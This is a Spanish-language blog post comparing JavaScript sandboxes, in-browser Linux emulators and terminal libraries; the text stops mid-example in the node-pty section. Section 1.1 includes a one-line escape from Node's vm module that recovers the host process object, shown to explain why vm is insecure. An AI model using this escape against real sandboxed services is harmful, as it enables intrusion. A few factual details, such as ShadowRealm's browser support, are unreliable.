---
title: Comparación de soluciones JavaScript para la simulación de núcleos Linux
description: Un análisis profundo de las reconstrucciones de entornos Linux
  en JavaScript/TypeScript.
date: 2026-05-28
tags:
  - javascript
  - linux
  - analysis
authors:
  - fox3000foxy
author_pubkey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEoFS9I15CAZojXYc6NMqggEYGct9o9b3JnWdXWOtlzgs2lclmqw8adtWgXUeeBMRHvm5LoajQ+OcImaAyA8jwYA=="
author_sig: "aiAdpdGowvNx7FscnhKmbwxeD7C48FQcszHjZtZHWnEEZsvN0mcD8dSfbOwKasA8YaR4OAwz51R60BnhNS2rPA=="
---

# Cada sandbox JavaScript, emulador, simulador y honeypot Linux: comparado

Bueno, llevo ya demasiado tiempo metido en esta madriguera de conejo. Todo empezó porque ayudaba en [typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container): un proyecto de Fortune (vuelvo a eso en un instante), y no paraban de preguntarme "oye, ¿qué diferencia hay con `v86`?" o "¿por qué no usar `vm2`?", y me di cuenta de que no podía dar una respuesta clara sin cartografiar todo el ecosistema primero. Así que aquí estamos, supongo.

Resulta que hay cuatro familias distintas: los sandboxes JS, los emuladores Linux, los simuladores Linux, y los honeypots, y casi nunca se solapan, aunque se mencionen constantemente en la misma frase. Alguien que construye un sistema de plugins usa `isolated-vm`. Alguien que hace una demo de herramienta CLI usa `v86`. Alguien que hace inteligencia de amenazas SSH usa Cowrie. Resuelven problemas por completo distintos bajo el mismo paraguas vago de "ejecutar código en una caja".

Pasé mucho tiempo leyendo código fuente, informes CVE, docs de arquitectura y páginas npm para escribir este artículo. Va a ser largo: coge un café, en serio. O dos.

> Pequeño disclaimer: `typescript-virtual-container` sale destacado en este artículo porque es lo que disparó esta investigación. Intenté ser justo con todo lo demás, pero ten ese contexto en mente.

---

## Parte 0: Primero, ¿qué problema estás resolviendo de verdad?

Antes de zambullirnos, vale la pena precisar para qué sirve cada familia, porque la terminología se vuelve rápido embarullada y la gente lo mezcla todo constantemente (yo incluido, antes de sentarme y cartografiarlo todo limpiamente).

**Los sandboxes JS** aíslan código JavaScript del proceso Node.js anfitrión. El modelo de amenaza es: código JS no fiable que podría llamar a `process.exit()`, leer archivos, o lanzar procesos hijos. La solución es una frontera alrededor de la ejecución V8. Estas herramientas no tienen noción de un shell Linux, de un sistema de archivos con permisos, ni de SSH.

**Los emuladores Linux** corren un verdadero núcleo Linux sin modificar en un emulador CPU (x86, RISC-V, OR1K) implementado en JavaScript o WebAssembly. Arrancas un verdadero SO. Tienes verdaderas llamadas al sistema. Tienes compatibilidad binaria con los programas compilados para x86. El coste en recursos es enorme.

**Los simuladores Linux** imitan el *comportamiento* de un sistema Linux sin correr un verdadero núcleo. Implementan un intérprete de shell, un sistema de archivos virtual, y suficiente semántica Unix para engañar a los programas y a los humanos. Sin núcleo, sin Wasm, sin emulación CPU. Muchísimos menos recursos.

**Los honeypots** están diseñados para atraer atacantes y registrar lo que hacen. No son principalmente entornos de ejecución: son herramientas de observabilidad. La fidelidad al comportamiento real de Linux solo importa en la medida en que impide al atacante detectar la trampa.

Con ese marco, aquí encaja cada proyecto de este artículo:

```
JS sandbox :       vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
Emulador Linux :  v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
Simulador Linux : typescript-virtual-container (único en este espacio)
Honeypot :         Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
Stack terminal :   xterm.js + node-pty (no es un aislador, pero conexo)
```

---

## Parte 1: Los sandboxes JavaScript

### 1.1 `vm`: el módulo nativo de Node.js (no lo que crees)

La respuesta más antigua a "ejecutar JS no fiable" en Node es el módulo nativo `vm`. Existe desde la v0.1, así que mucha gente lo usa primero, y se quema.

```js
const vm = require("vm");
const sandbox = { answer: 0 };
vm.createContext(sandbox);
vm.runInContext("answer = 6 * 7", sandbox);
console.log(sandbox.answer); // 42
```

Lo que `vm` hace realmente: crea un nuevo contexto V8 (un nuevo conjunto de constructores nativos: `Object`, `Array`, `Function`, etc.) y ejecuta código dentro, con una referencia compartida hacia lo que metas en `sandbox`. Tu motor V8 no cambia. Tu proceso no cambia. La memoria se comparte.

La razón por la que `vm` no ofrece ninguna seguridad: la cadena de prototipos de JavaScript es un DAG que conecta todo con `Object.prototype`. Si metes un objeto del mundo anfitrión en el sandbox, el invitado puede subir por su cadena de prototipos y alcanzar los constructores anfitriones. Desde `Function`, puedes llamar a `Function("return process")()` y recuperar el verdadero `process`. Fin de la partida. Como, de inmediato.

```js
// Esto funciona perfecto en vm: recuperas el verdadero process
vm.runInNewContext(`({}).__proto__.constructor("return process")()`);
```

O sea, la propia documentación de Node.js dice: "El módulo vm no es un mecanismo de seguridad. No lo uses para ejecutar código no fiable." Esa advertencia está ahí desde siempre. La gente la ignora constantemente. Vi aplicaciones en producción usando `vm` como sandbox. Por favor, no hagas eso.

**Veredicto**: un mecanismo de alcance, no un sandbox. Úsalo cuando necesites aislar variables (motores de plantillas, funciones tipo `eval` donde controlas el código). Jamás para entradas no fiables.

**Memoria**: sobrecarga despreciable: mismo heap V8 que el proceso anfitrión.
**Seguridad**: ninguna contra un atacante motivado.

---

### 1.2 `vm2`: el intento comunitario, y su larguísima muerte

`vm2` era la respuesta de la comunidad al problema de evasión de `vm`. La idea central: envolver cada objeto que cruza la frontera del sandbox en un `Proxy` que intercepta los accesos a propiedades, bloquea la subida de prototipos, y filtra las referencias peligrosas. ¡Idea inteligente en teoría! En la práctica, el resultado se reveló mucho menos convincente, como veremos.

```js
const { VM } = require("vm2");
const vm = new VM({ timeout: 1000, sandbox: {} });
vm.run("process.exit(1)"); // lanza VMError, process inaccesible
```

Durante varios años, funcionó bastante bien. Pero la superficie de ataque de los `Proxy` JavaScript es enorme. Cada nueva función del lenguaje JS: generadores, iteradores asíncronos, `Symbol.toPrimitive`, `Error.prepareStackTrace`, los slots internos de `Promise`, es un vector potencial de rodeo.

La cronología de los CVE es... algo. O sea, mira esto:

| Fecha | CVE | Mecanismo |
|------|-----|-----------|
| Oct 2022 | CVE-2022-36067 | Evasión del contexto anfitrión vía `Error.prepareStackTrace` |
| Abr 2023 | CVE-2023-29017 | Fuga de objeto anfitrión vía error async no gestionado |
| Abr 2023 | CVE-2023-29199 | Rodeo del saneamiento de excepciones vía `handleException()` |
| Abr 2023 | CVE-2023-30547 | `Proxy.getPrototypeOf` → `Function` → RCE |
| May 2023 | CVE-2023-32314 | `Proxy` sobre `Error.name` → `Function` → RCE |
| Jun 2023 | CVE-2023-37466 | Función async + desbordamiento de pila + `Proxy.getPrototypeOf` |
| Jun 2023 | CVE-2023-37903 | Worker thread + evasión por eval |

Tres CVE críticos el mismo mes (abril de 2023). TRES. EN UN MES. Tras CVE-2023-37903, el mantenedor depreció oficialmente la librería con el mensaje: *"La librería contiene problemas de seguridad críticos y no debería usarse en producción."*

El mantenedor la resucitó en octubre de 2025 con la versión 3.10.0, afirmando haber corregido todo lo conocido en la época. Una nueva evasión crítica (CVE-2026-22709, CVSS 9.8) se divulgó en enero de 2026, seguida de un lote de otras once en mayo de 2026. Once. El patrón no cambió y honestamente no creo que cambie nunca.

El problema fundamental es arquitectónico: y es la lección que tardó un rato todo el ecosistema en aprender. No puedes construir un sandbox seguro usando el mismo lenguaje que aíslas, sobre el mismo motor, en el mismo proceso. La superficie de evasión es la implementación entera de V8: y V8 son varios millones de líneas de C++ que cambian constantemente. Cada nueva función JS abre potencialmente una nueva vía de ataque.

**Veredicto**: No usar para aplicaciones sensibles a la seguridad. Incluso en la última versión, se descubren nuevos rodeos cada pocos meses. El propio mantenedor lo reconoció abiertamente.

---

### 1.3 `isolated-vm`: el que funciona de verdad

`isolated-vm` adopta el enfoque bueno: usar la primitiva de aislamiento nativa de V8, el Isolate. Cada Isolate V8 tiene su propio heap, su propio recolector de basura, su propio conjunto de nativos, y cero referencias compartidas con los demás Isolates.

Es la misma frontera que usa Chrome entre las pestañas. Es una verdadera barrera de seguridad, no un truco de lenguaje construido sobre Proxys.

```js
import ivm from "isolated-vm";

// Cada isolate es su propio heap V8
const isolate = new ivm.Isolate({ memoryLimit: 64 }); // límite en MB
const context = await isolate.createContext();
const jail = context.global;

// Pasar datos a través de la frontera necesita serialización explícita
await jail.set("sensitiveData", "not this");
await jail.set("log", new ivm.Reference(console.log));

const script = await isolate.compileScript(`
  // No puede alcanzar el proceso anfitrión, el heap anfitrión ni los módulos anfitriones
  log.applySync(undefined, ["hello from the isolate"]);
`);
await script.run(context);

// Puedes terminar brutalmente en timeout o límite de memoria
isolate.dispose(); // libera todo el heap
```

Los tipos `Reference` y `ExternalCopy` son el puente de comunicación explícito. Una `Reference` da al isolate un handle invocable hacia una función anfitriona: el isolate puede llamarla pero no puede inspeccionar su clausura ni su prototipo. Un `ExternalCopy` serializa un valor (clon estructurado) a través de la frontera del heap. Ese modelo de puente explícito no es cómodo, pero es lo que hace real el aislamiento.

Puedes definir límites de recursos estrictos: memoria (el isolate se termina si supera el límite), timeout de reloj mural, y timeout CPU. La terminación es real: mata todo el Isolate V8, no solo un timeout JS que se puede rodear con un `while(true)`.

**Límites**: es solo JS. No puedes ejecutar bash dentro. No hay noción de archivos, de permisos, de red ni de procesos. Es exactamente la herramienta buena para JS enviado por el usuario (plugins, fórmulas, hooks de script), y la herramienta mala para todo lo demás. La autora de `typescript-virtual-container` mencionó que lo había contemplado al principio antes de darse cuenta de que "ejecutar comandos shell" y "aislar JavaScript" son problemas fundamentalmente distintos.

**Memoria**: ~3-10 MB por isolate vacío, sube con el uso del heap.
**Seguridad**: sólida. La frontera V8 Isolate es la verdadera primitiva de aislamiento.
**npm**: [isolated-vm](https://www.npmjs.com/package/isolated-vm)
**GitHub**: [laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)

---

### 1.4 `quickjs-emscripten`: un motor JS separado compilado en Wasm

Un enfoque distinto: en vez de aislar en V8, correr un motor JavaScript por completo separado compilado en WebAssembly. El anfitrión corre en V8/Node. El invitado corre en QuickJS-en-Wasm. El sandbox Wasm aporta la frontera de aislamiento.

QuickJS sigue siendo obra de Fabrice Bellard (el mismo tío tras QEMU, FFmpeg, JSLinux, TinyEMU: esa persona no es real, en serio, ¿cómo hace una sola persona todo eso?). Es un pequeño motor JS conforme a la norma ES2023 escrito en C, y compilado en Wasm no pesa más que unos 500 KB.

```js
import { getQuickJS } from "quickjs-emscripten";

const QuickJS = await getQuickJS();
const vm = QuickJS.newContext();

const result = vm.evalCode(`
  // Corre en QuickJS, por completo separado de V8
  (function() { return 6 * 7; })()
`);

if (result.error) {
  console.log("Error:", vm.dump(result.error));
  result.error.dispose();
} else {
  console.log("Result:", vm.dump(result.value)); // 42
  result.value.dispose();
}

vm.dispose();
```

QuickJS es un pequeño motor JavaScript conforme a ES2023 escrito en C. Compilado en Wasm, pesa unos 500 KB para la variante síncrona, ~1 MB para la variante asíncrona (Asyncify). La gestión de la memoria es manual: cada valor que extraes de la VM tiene que liberarse explícitamente, lo cual es un poco pesado pero impide las sorpresas de GC entre fronteras. ¡Un compromiso divertido!

El wrapper `@sebastianwessel/quickjs` añade una API más ergonómica por encima, con un sistema de archivos virtual opcional, soporte fetch, y stubs de módulos Node.js:

```ts
import variant from "@jitl/quickjs-ng-wasmfile-release-sync";
import { loadQuickJs } from "@sebastianwessel/quickjs";

const { runSandboxed } = await loadQuickJs(variant);

const result = await runSandboxed(
  async ({ evalCode }) => evalCode(`
    import { join } from 'path';
    export default join('src', 'dist');
  `),
  { allowFs: false, allowFetch: false }
);
```

El modelo de seguridad es distinto del de `isolated-vm`: el modelo de memoria lineal de Wasm hace que el invitado no pueda acceder directamente a los objetos del heap V8. La superficie de ataque es la interfaz anfitrión↔Wasm (imports/exports), no todo el lenguaje JS. Generalmente se considera más robusto que los sandboxes basados en Proxy.

El reverso: QuickJS no tiene el mismo nivel de optimización que V8. Para cargas CPU-bound en JS, es de 5 a 20 veces más lento que V8. Para trocitos de código y evaluaciones no fiables, generalmente no importa.

**Memoria**: ~500 KB módulo Wasm + heap por instancia.
**Seguridad**: frontera Wasm, considerada más sólida que los enfoques basados en Proxy.
**npm**: [quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten), [@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)
**GitHub**: [justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)

---

### 1.5 Deno: un runtime que pone los permisos primero

Deno adopta una filosofía por completo distinta: en vez de hacer sandbox en Node, construir un nuevo runtime que es seguro por defecto. Me encanta ese enfoque: es lo que Node.js debería haber sido desde el principio, honestamente. Ryan Dahl (el creador original de Node.js) literalmente creó Deno porque lamentaba ciertas decisiones de diseño de Node.js, lo cual es bastante loco cuando lo piensas.

Cada capacidad sensible (lectura de archivo, escritura de archivo, red, entorno, subproceso) necesita un flag `--allow-*` explícito:

```bash
# Este solo puede leer en /data, nada más
deno run --allow-read=/data script.ts

# Este solo puede acceder a un solo dominio
deno run --allow-net=api.example.com script.ts

# Sin flags = ningún permiso
deno run untrusted.ts # no puede leer, escribir, red, lanzar
```

El modelo de permisos está implementado a nivel Rust/OS: no es un truco JS. Cuando código Deno llama a `Deno.readFile()`, pasa por una operación Rust que comprueba la tabla de permisos antes de tocar el sistema de archivos. No puedes rodearlo desde JS porque la llamada al sistema nunca ocurre si el permiso no está concedido.

Para ejecutar código de verdad no fiable, los Workers Deno (Web Workers) aportan un segundo isolate en el mismo proceso, cada uno con su propio conjunto de permisos. Puedes lanzar un worker con cero permisos y comunicarte con él vía `postMessage`.

Deno 2 (salido en octubre de 2024) añadió la compatibilidad npm completa y shims de compatibilidad Node.js, lo que mejoró considerablemente su adopción para los casos de uso en servidor.

**El compromiso**: el modelo de seguridad de Deno es excelente para código en el que podrías confiar parcialmente. Para código por completo no fiable que podría ser adversarial, el modelo de permisos no ayuda: necesitas una frontera Isolate (`isolated-vm`) o un motor distinto (`quickjs-emscripten`), porque Deno sigue usando V8 y atacantes sofisticados pueden encontrar bugs a nivel V8.

---

### 1.6 TC39 ShadowRealm: la respuesta estandarizada (algún día)

El organismo de normalización JavaScript (TC39) tiene una propuesta llamada ShadowRealm que intenta estandarizar lo que `vm` y `vm2` intentaban hacer, pero con un modelo de seguridad correcto. Un ShadowRealm crea un contexto de ejecución JS aislado con sus propios intrínsecos, ningún acceso al reino exterior, y una interfaz de import/export cuidadosamente controlada.

```js
const realm = new ShadowRealm();
const result = realm.evaluate(`
  // Intrínsecos separados, sin acceso al reino exterior
  typeof globalThis.fetch // "undefined"
  6 * 7 // 42
`);
```

ShadowRealm está disponible en los navegadores (Chrome 90+, Firefox 105+) pero aún no está en Node.js estable en 2026. La propuesta TC39 Compartments se apoya en ella para el aislamiento a nivel de módulos. Son las respuestas estandarizadas a largo plazo, pero aún no están listas para producción en servidor Node. Es uno de esos proyectos que ves venir de lejos pero... simplemente aún no está. Clásico de TC39.

---

### Resumen de la familia de los sandboxes

| | `vm` | `vm2` | `isolated-vm` | `quickjs-emscripten` | Deno Workers |
|---|---|---|---|---|---|
| **Frontera de aislamiento** | ninguna (alcance) | Proxy (roto) | V8 Isolate | Wasm | V8 Isolate + perms Rust |
| **Límite de memoria** | ❌ | ❌ | ✅ límite estricto | ✅ heap Wasm | parcial |
| **Timeout CPU** | ❌ | ✅ (rodeable) | ✅ estricto | ✅ | ✅ |
| **Seguridad** | ninguna | rota | sólida | sólida | sólida |
| **Velocidad JS** | V8 nativo | V8 nativo | V8 nativo | ~10x más lento | V8 nativo |
| **Navegador** | ❌ | ❌ | ❌ | ✅ | ❌ |
| **Compatibilidad Node** | nativo | ✅ | ✅ | shims parciales | parcial |
| **Estado** | estable | arriesgado (nuevos CVE) | ✅ activo | ✅ activo | ✅ activo |
| **Sobrecarga RAM** | ~1 MB | ~5-20 MB | ~3-10 MB | ~5-15 MB | ~10-30 MB |

El veredicto: si la seguridad te importa, hay exactamente dos verdaderas opciones: `isolated-vm` (extensión nativa, V8 Isolate, plena velocidad JS) y `quickjs-emscripten` (Wasm, compatible navegador, ~10x más lento para cálculo intensivo). Todo lo demás es o bien "por favor no hagas eso" (`vm`, `vm2`) o bien un runtime que resuelve un problema por completo distinto (Deno). ShadowRealm podría cambiar las reglas algún día, pero aún no es el caso.

---

## Parte 2: Los emuladores Linux en JavaScript

Aquí las cosas se vuelven de verdad interesantes para mí. Son *verdaderos* emuladores: implementan un juego de instrucciones CPU en JavaScript o WebAssembly, arrancan una verdadera imagen de núcleo Linux, y ejecutan verdaderos binarios de usuario. El aislamiento viene de que el invitado y el anfitrión no comparten nada: distintos espacios de memoria, distintos flujos de instrucciones.

El precio a pagar es enorme, pero lo que obtienes es de verdad notable: verdadero Linux, corriendo de verdad, en tu navegador o tu proceso Node. O sea, es bastante loco cuando lo piensas, ¿no?

### 2.1 `v86`: emulador PC x86 en JS + JIT Wasm

`v86` por Fabrice (copy en GitHub) es el emulador x86 open source más capaz en JavaScript. Empezó como un intérprete JS puro hacia 2013 y evolucionó hacia un sistema JIT donde los bloques básicos x86 se traducen a WebAssembly al vuelo, mejorando considerablemente el rendimiento.

Lo que emula:
- **CPU**: x86-32 (IA-32), juego de instrucciones más o menos a nivel Pentium 1. El 64-bit (x86-64) queda excluido: es un límite arquitectónico material, no una función que falte.
- **FPU**: vía `Float64Array` de JavaScript. El x87 es en precisión extendida 80-bit; los doubles JS son en 64-bit. Eso significa que los resultados en coma flotante pueden diferir ligeramente de un verdadero CPU.
- **Memoria**: configurable, mapea hacia un `SharedArrayBuffer` o `ArrayBuffer` en el heap JS.
- **Material**: 8254 PIT (timer), 8259 PIC (controlador de interrupciones), controlador teclado 8042 (PS/2), CMOS RTC, VGA con extensiones SVGA y Bochs VBE, controlador IDE, controlador disquetera (8272A), tarjeta red NE2000.
- **BIOS**: usa SeaBIOS (BIOS x86 open source).

El JIT funciona identificando bloques básicos (secuencias de instrucciones x86 sin saltos), traduciéndolos a una función WebAssembly, cacheando esa función, y llamándola en las ejecuciones siguientes del mismo bloque. Las rutas de código calientes obtienen rendimiento Wasm nativo. Las rutas frías caen al intérprete JS.

```js
import { V86 } from "v86";
import { readFileSync } from "fs";

const emulator = new V86({
  bios:    { buffer: readFileSync("./bios/seabios.bin") },
  vga_bios:{ buffer: readFileSync("./bios/vgabios.bin") },
  hda:     { buffer: readFileSync("./images/alpine.img"), async: false },
  memory_size: 128 * 1024 * 1024, // 128 MB
  autostart: true,
});

// Capturar la salida serie (consola núcleo Linux)
emulator.add_listener("serial0-output-byte", byte => {
  process.stdout.write(String.fromCharCode(byte));
});

// Enviar una entrada al invitado (escribir en el shell)
emulator.serial0_send("ls /\n");
```

**SO soportados**: Alpine Linux (excelente), Ubuntu 16.04/18.04 (i386 solo), Arch Linux 32, ReactOS, FreeDOS, Windows 9x/2000 (con reservas), MS-DOS.

**Tiempo de arranque**: 15-40 segundos para Alpine Linux desde una imagen limpia. Es inherente a la inicialización real del núcleo: no puedes saltarla. Sí, tus usuarios van a mirar un núcleo Linux arrancar en su navegador. Es el trato.

**Memoria mínima**: 100-256 MB por instancia. Solo el caché de código Wasm JIT puede alcanzar decenas de MB para una instancia Linux ocupada.

**Uso en Node.js**: totalmente soportado. El DOM queda superfluo: la salida VGA puede ignorarse si solo te interesa la salida serie.

**Lo que no puedes hacer**: ejecutar binarios 64-bit, usar funciones modernas del núcleo (eBPF, io_uring, etc.), o correr más de un puñado de instancias simultáneas sin tocar los límites de memoria.

**npm**: [v86](https://www.npmjs.com/package/v86): actualizado continuamente, última publicación el mismo día al momento de escribir.
**GitHub**: [copy/v86](https://github.com/copy/v86)
**Demo**: [copy.sh/v86](https://copy.sh/v86)

---

### 2.2 JSLinux y TinyEMU: el trabajo de Bellard, en dos veces

JSLinux es el propio emulador Linux en JavaScript de Fabrice Bellard: el primero de todos, publicado en 2011. Sigo mencionando a Bellard en este artículo porque no para de reaparecer: QuickJS, TinyEMU, JSLinux, QEMU, FFmpeg. Ese tío es otra cosa. De verdad una de las contribuciones técnicas individuales más impresionantes de la historia del software, sin exagerar.

El JSLinux original era un intérprete x86 puro JS. En 2016, Bellard escribió TinyEMU (un emulador RISC-V en C), lo compiló en JavaScript vía Emscripten, y eso se volvió la base del JSLinux actual. Así que el JSLinux actual es en realidad código C que genera JavaScript: nada de JS escrito a mano.

Las notas técnicas en el sitio de Bellard merecen leerse: el JSLinux actual corre un CPU RISC-V 32 o 64-bit (no x86), emulando una consola VirtIO, una red VirtIO, un dispositivo bloque VirtIO, y un sistema de archivos 9P para compartir archivos con el anfitrión. La demo JS está compilada desde C usando Emscripten: no es JS escrito a mano.

TinyEMU en sí soporta:
- RISC-V RV32IMAFDQC y RV64IMAFDQC (32 y 64-bit, con coma flotante, multiplicación, instrucciones comprimidas)
- x86 vía KVM (nativo solo, sin emulación: así que la versión JS es RISC-V solo)
- Consola VirtIO, red, bloque, entrada, sistema de archivos 9P

TinyEMU tiene una demo JavaScript provista vía Emscripten. Es la base de JSLinux y también la usa `container2wasm` (ver sección 2.5).

**Estado JSLinux**: sin package npm, sin API programable. Es una demo que abres en tu navegador. La importancia histórica es grande: probó el concepto. La utilidad práctica como librería: nula.

**TinyEMU**: no en npm, fuente C disponible en [bellard.org/tinyemu](https://bellard.org/tinyemu/).

---

### 2.3 jor1k: emulador OR1K

jor1k es un emulador OpenRISC 1000 (OR1K) escrito en JavaScript por Sebastian Macke. Es interesante históricamente porque jor1k introdujo el soporte del sistema de archivos VirtIO 9P, que Bellard integró después en TinyEMU y JSLinux. La polinización cruzada entre esos proyectos es estrecha: todos se toman prestadas ideas unos a otros, que es honestamente una de las cosas más guays del trabajo de emulación open source.

**Estado**: ya no mantenido activamente, sin package npm. Archivado a estas alturas. Útil de conocer sobre todo por el contexto histórico: o sea si alguien menciona jor1k en una conversación, ahora sabes qué es :)

---

### 2.4 CheerpX: emulador x86 comercial para el navegador

CheerpX por Leaning Technologies es el emulador Linux x86 comercial de calidad producción. No es open source, pero es claramente más capaz que v86 para correr un verdadero userspace Debian/Ubuntu. Si necesitas un verdadero VSCode en el navegador, es lo que necesitas.

Diferencias clave con v86:
- Soporta un ISA más amplio (más extensiones x86, mejor compatibilidad glibc)
- Sistema de archivos basado en IndexedDB en el navegador (persistente entre recargas de página)
- Soporte pthread vía `SharedArrayBuffer` (que necesita las cabeceras COOP/COEP: sí esas cabeceras de seguridad molestas)
- Diseñado para correr VSCode, Python, Node.js, y otras aplicaciones reales: no solo imágenes OS mínimas
- Soporte profesional y SLA disponible (o sea puedes echarle la bronca a alguien si se rompe)

El caso de uso típico es "correr una verdadera aplicación Linux en el navegador sin servidor". Hay empresas que lo usan para IDE basados en navegador, tutoriales de programación, y documentación interactiva.

```js
// API CheerpX (simplificada)
const cx = await CheerpX.Linux.create({
  mounts: [{ type: "ext2", path: "/", dev: CloudDevice.create(...) }],
});
await cx.run("/bin/bash");
```

**Historia con Node.js**: CheerpX está diseñado primero para el navegador. El emulador subyacente podría teóricamente funcionar en Node (es Wasm), pero la API y la documentación están por completo orientadas a un uso navegador. El uso en servidor no está soportado.

**Memoria**: similar a v86: 200+ MB para una verdadera instancia Debian.
**Tarifas**: gratis para los proyectos open source, licencia comercial para SaaS en producción.
**Docs**: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)

---

### 2.5 WebContainers (StackBlitz): Node.js en Wasm, no emulación Linux

Los WebContainers suelen meterse en el mismo saco que los emuladores Linux pero son arquitectónicamente distintos. No emulan x86. No arrancan Linux. Corren Node.js compilado en WebAssembly usando WASI. Esa distinción cuenta mucho y pasé demasiado tiempo confuso sobre eso.

Creo que la confusión viene del marketing: "correr Node.js en tu navegador" suena a emulación, pero en realidad es Node.js mismo compilado en Wasm, no una emulación Linux que corre Node.js en una VM. Dos arquitecturas por completo distintas.

La arquitectura:
1. Node.js está compilado en Wasm (un runtime WASI personalizado específicamente)
2. Un Service Worker intercepta las peticiones red del servidor Node.js emulado y las rutea hacia la pestaña del navegador
3. El sistema de archivos vive en la memoria del navegador (sin E/S disco)
4. npm es una implementación personalizada optimizada para un uso en el navegador

```js
import { WebContainer } from "@webcontainer/api";

const webcontainer = await WebContainer.boot();

// Escribir archivos
await webcontainer.mount({
  "index.js": { file: { contents: `console.log("hello")` } },
  "package.json": { file: { contents: `{"name":"demo","type":"module"}` } }
});

// Ejecutar comandos Node.js
const proc = await webcontainer.spawn("node", ["index.js"]);
proc.output.pipeTo(new WritableStream({ write: chunk => console.log(chunk) }));
```

Como ejecuta verdadero Node.js (compilado en Wasm), tienes un verdadero npm, verdaderas API Node.js, y verdadera resolución de módulos. No tienes un userspace Linux generalista: no puedes instalar paquetes sistema con `apt`, ejecutar binarios compilados arbitrarios, ni hacer gran cosa fuera del ecosistema Node.js.

**Prerrequisitos navegador**: SharedArrayBuffer (necesita las cabeceras COOP/COEP), soporte Service Worker, Wasm moderno.

**Historia con Node.js**: diseñado exclusivamente para un uso navegador. La API no funciona fuera de un contexto navegador.

**npm**: [@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)
**Docs**: [webcontainers.io](https://webcontainers.io)

---

### 2.6 container2wasm: contenedores Docker compilados en Wasm

`container2wasm` es una herramienta (no un package npm) de NTT que toma una imagen de contenedor Docker y la convierte en un binario WebAssembly que puede correr en cualquier anfitrión Wasm: incluido un navegador. Cuando vi eso por primera vez, de verdad no creí que funcionara.

El mecanismo:
- Para los contenedores x86_64: incrusta Bochs (un emulador x86, compilado en Wasm) + el sistema de archivos raíz del contenedor
- Para los contenedores riscv64: incrusta TinyEMU (¡Bellard otra vez!) + el sistema de archivos raíz del contenedor
- El archivo `.wasm` resultante arranca el emulador, monta el sistema de archivos del contenedor, y ejecuta el punto de entrada del contenedor

```bash
# Convertir un contenedor Ubuntu 22.04 en Wasm
c2w ubuntu:22.04 out.wasm

# Ejecutarlo
wasmtime out.wasm uname -a
# Linux 5.15.0 #1 SMP riscv64 GNU/Linux

# O servirlo para un uso navegador
c2w --to-js ubuntu:22.04 /tmp/htdocs/
```

El `.wasm` resultante es voluminoso: una Ubuntu mínima pesa varios cientos de MB, pero es por completo autónomo. Puedes enviar un `.wasm` por email a alguien y puede correr Ubuntu en su navegador. Esa frase no debería tener sentido pero aquí estamos.

**GitHub**: [container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)

---

### Resumen de la familia de los emuladores

| | `v86` | JSLinux/TinyEMU | jor1k | CheerpX | WebContainers | container2wasm |
|---|---|---|---|---|---|---|
| **Arquitectura** | x86-32 JIT→Wasm | RISC-V (Wasm) | OR1K (JS) | x86 (propietario) | Node.js→Wasm/WASI | x86/RISC-V (Wasm) |
| **Verdadero núcleo** | ✅ | ✅ | ✅ | ✅ | ❌ (Node.js) | ✅ |
| **64-bit** | ❌ | ✅ (RISC-V) | ❌ | ✅ | n/a | ✅ |
| **Package npm** | ✅ | ❌ | ❌ | CDN/API | ✅ | ❌ (herramienta CLI) |
| **Uso Node.js** | ✅ | ❌ | ❌ | ❌ | ❌ (navegador only) | vía Wasmtime |
| **Uso navegador** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| **RAM/instancia** | 150-256 MB | ~64-128 MB | ~64 MB | 200+ MB | ~100 MB | ~200-500 MB |
| **Tiempo arranque** | 15-40s | 10-30s | 10-30s | 15-40s | 2-5s | 10-40s |
| **Open source** | ✅ | ✅ | ✅ | ❌ | parcial | ✅ |
| **Estado** | ✅ muy activo | ✅ estable | ⚠️ archivado | ✅ comercial | ✅ activo | ✅ activo |

Lo que salta a la vista en esa tabla: `v86` es el único que es un package npm, que corre a la vez en el navegador y Node, y que es open source. Por eso domina la conversación sobre los "emuladores Linux en JavaScript". Todo lo demás tiene un inconveniente: JSLinux no tiene API, jor1k está archivado, CheerpX cuesta dinero, WebContainers es navegador-only y específico de Node, container2wasm necesita una etapa de build y un CLI. Si solo necesitas "arrancar Linux en JavaScript", `v86` es casi siempre el buen punto de partida.

## Parte 3: Las stacks terminal: xterm.js y node-pty

Dos packages vuelven constantemente cuando la gente construye experiencias tipo shell. No son sandboxes ni emuladores: son la fontanería UI y PTY, pero están tan conexos que me sentiría mal dejarlos fuera. Además, los usé ambos y son realmente buenos.

### 3.1 `xterm.js`: el render del terminal

xterm.js es un emulador de terminal para el navegador. Muestra una pantalla de terminal (secuencias de escape VT100/xterm) en un elemento `<canvas>`, gestiona las entradas de teclado, y expone una API para encaminar los datos.

Usado por: el terminal integrado de VS Code, Azure Cloud Shell, Proxmox VE, AWS CloudShell, y muchos más.

```js
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";

const term = new Terminal({ cursorBlink: true });
const fitAddon = new FitAddon();
term.loadAddon(fitAddon);
term.open(document.getElementById("terminal"));
fitAddon.fit();

// Enviar datos al terminal (mostrado como texto)
term.write("$ ");
term.onData(data => {
  // data son las pulsaciones: envíalas a tu backend
  socket.send(data);
});
socket.onmessage(msg => {
  // salida del backend: muéstrala
  term.write(msg.data);
});
```

xterm.js es solo la capa de render. No ejecuta ningún shell. No interpreta los comandos. Es un widget de visualización que conectas al backend que elijas. Mucha gente cree que xterm.js "hace el terminal" pero en realidad es solo la pantalla: aún tienes que conectarlo a algo que ejecute de verdad los comandos.

**npm**: [@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)
**GitHub**: [xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)

---

### 3.2 `node-pty`: creación de PTY

`node-pty` crea un pseudoterminal (PTY) en Node.js y te da un handle de lectura/escritura sobre él. Usado con xterm.js, permite construir un terminal navegador que habla con un verdadero shell (bash, zsh, fish) corriendo en el servidor.

```js
import * as pty from "node-pty";

